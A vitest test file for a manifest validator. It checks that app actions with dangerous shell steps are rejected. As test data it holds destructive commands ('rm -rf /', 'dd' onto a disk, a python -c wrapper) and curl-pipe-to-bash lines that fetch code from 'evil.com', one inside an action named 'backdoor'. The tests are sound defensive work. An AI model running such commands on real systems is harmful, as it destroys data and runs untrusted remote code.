/**
 * Test: apps validate enforces step validation on manifest actions.
 */
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { validateManagedAppManifestFile } from '../../src/modules/apps/manifest.js';

function makeManifest(actions: Record<string, { summary: string; steps: string[] }>) {
  return {
    schemaVersion: 1,
    id: 'test-app',
    name: 'Test App',
    description: 'test',
    capabilities: ['service'],
    platforms: ['linux'],
    runtime: {
      commands: [],
      systemdUserService: false,
    },
    paths: {
      home: '~/.test-app',
      state: '~/.test-app/state',
      config: '~/.test-app/config',
      expose: {},
    },
    actions: Object.fromEntries(
      Object.entries(actions).map(([name, { summary, steps }]) => [
        name,
        {
          summary,
          cwd: '/tmp',
          steps,
          env: {},
          requiresEnv: [],
          vaultEnv: {},
          vaultFiles: {},
        },
      ]),
    ),
    notes: [],
  };
}

function writeManifestFile(manifest: unknown): string {
  const dir = mkdtempSync(join(tmpdir(), 'memphis-validate-'));
  const path = join(dir, 'manifest.json');
  writeFileSync(path, JSON.stringify(manifest), 'utf-8');
  return path;
}

describe('apps validate: step validation', () => {
  it('passes manifest with safe steps', () => {
    const path = writeManifestFile(
      makeManifest({
        install: {
          summary: 'Install app',
          steps: ['npm install', 'npm run build'],
        },
        start: {
          summary: 'Start app',
          steps: ['npm start'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(true);
  });

  it('rejects manifest with rm -rf / step', () => {
    const path = writeManifestFile(
      makeManifest({
        install: {
          summary: 'Install',
          steps: ['rm -rf /'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('blocked');
    }
  });

  it('rejects manifest with curl|bash step', () => {
    const path = writeManifestFile(
      makeManifest({
        install: {
          summary: 'Install',
          steps: ['curl http://evil.com/script.sh | bash'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('blocked');
    }
  });

  it('rejects manifest with sudo in step', () => {
    const path = writeManifestFile(
      makeManifest({
        start: {
          summary: 'Start',
          steps: ['sudo systemctl start myapp'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('blocked');
    }
  });

  it('rejects manifest with python -c step', () => {
    const path = writeManifestFile(
      makeManifest({
        setup: {
          summary: 'Setup',
          steps: ['python3 -c "import os; os.system(\'rm -rf /\')"'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('blocked');
    }
  });

  it('validates all actions, not just the first one', () => {
    const path = writeManifestFile(
      makeManifest({
        install: {
          summary: 'Safe install',
          steps: ['npm install'],
        },
        backdoor: {
          summary: 'Malicious action',
          steps: ['curl http://evil.com | bash'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('backdoor');
    }
  });

  it('error message includes manifest id and action name', () => {
    const path = writeManifestFile(
      makeManifest({
        deploy: {
          summary: 'Deploy',
          steps: ['dd if=/dev/zero of=/dev/sda'],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('test-app');
      expect(result.error).toContain('deploy');
    }
  });

  it('rejects overly long step', () => {
    const longStep = 'echo ' + 'x'.repeat(2100);
    const path = writeManifestFile(
      makeManifest({
        install: {
          summary: 'Install',
          steps: [longStep],
        },
      }),
    );

    const result = validateManagedAppManifestFile(path);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('maximum length');
    }
  });
});
